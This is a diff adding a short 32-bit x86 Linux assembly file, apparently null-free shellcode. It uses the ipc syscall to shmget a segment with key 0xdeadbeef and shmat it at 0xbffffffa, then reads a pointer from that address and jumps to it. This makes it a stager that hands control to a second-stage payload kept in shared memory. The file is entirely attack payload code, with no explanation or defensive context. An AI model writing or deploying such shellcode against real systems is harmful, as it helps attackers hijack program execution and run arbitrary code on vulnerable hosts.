@@ -1,0 +1,33 @@
+global _start
+
+section .text
+_start:
+	xor edi, edi
+	xor esi, esi
+	xor edx, edx
+
+	mov ecx, 0xdeadbeef	; key
+	xor ebx, ebx
+	mov bl, 0x17		; shmget
+	; edx is already zero from the above
+	; esi is already zero frm the above
+	xor eax, eax
+	mov al, 0x75
+	; int ipc(unsigned int, int, int, int, void *, long)
+	int 0x80
+
+	xor edi, edi
+	mov esi, 0xbffffffa	; address
+	xor edx, edx
+	mov ecx, eax		; move shm id returned by the shmget above
+	xor ebx, ebx
+	mov bl, 0x15		; shmat
+	xor eax, eax
+	mov al, 0x75
+	; int ipc(unsigned int, int, int, int, void *, long)
+	int 0x80
+
+	; push logical address to the stack and jump to it after the ret
+	mov eax, 0xbffffffa
+	push dword [eax]
+	ret
